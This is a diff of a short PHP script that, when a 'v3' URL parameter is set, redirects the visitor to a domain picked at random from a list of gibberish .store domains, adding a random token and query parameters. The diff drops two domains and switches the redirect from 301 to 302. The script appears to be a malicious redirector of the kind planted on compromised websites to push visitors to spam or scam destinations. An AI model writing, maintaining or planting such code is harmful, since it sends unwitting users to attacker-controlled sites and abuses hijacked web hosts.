@@ -1,6 +1,6 @@
 <?php if(isset($_GET['v3']) && $_GET['v3'] != '') {
 
-    $domains = array('kustover.store', 'gadadsdfs.store', 'iobeasto.store', 'jollibekoilop.store', 'onesunwithme.store', 'popzeronickkkk.store', 'sunnyfacein.store', 'testdopioi.store', 'uipoasto.store', 'zeronickkkk.store', 'golingol.store', 'holipouy.store', 'ifkolistaho.store', 'joilopstok.store', 'joliahort.store', 'kiuyilop.store', 'koinbeoilop.store', 'molistrojok.store', 'rafffoptik.store', 'sneakkondaho.store'); 
+    $domains = array('gadadsdfs.store', 'iobeasto.store', 'jollibekoilop.store', 'onesunwithme.store', 'popzeronickkkk.store', 'testdopioi.store', 'uipoasto.store', 'zeronickkkk.store', 'golingol.store', 'holipouy.store', 'ifkolistaho.store', 'joilopstok.store', 'joliahort.store', 'kiuyilop.store', 'koinbeoilop.store', 'molistrojok.store', 'rafffoptik.store', 'sneakkondaho.store'); 
     $count_domains = count($domains) - 1;
     $uniqw = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, 8);
     
@@ -10,7 +10,7 @@
     $queryString = http_build_query($queryParams);
     $redirectURL = $baseURL."&".$queryString;
 
-    header("Location: ".$redirectURL, true, 301);
+    header("Location: ".$redirectURL, true, 302);
     exit;
 
 } else {
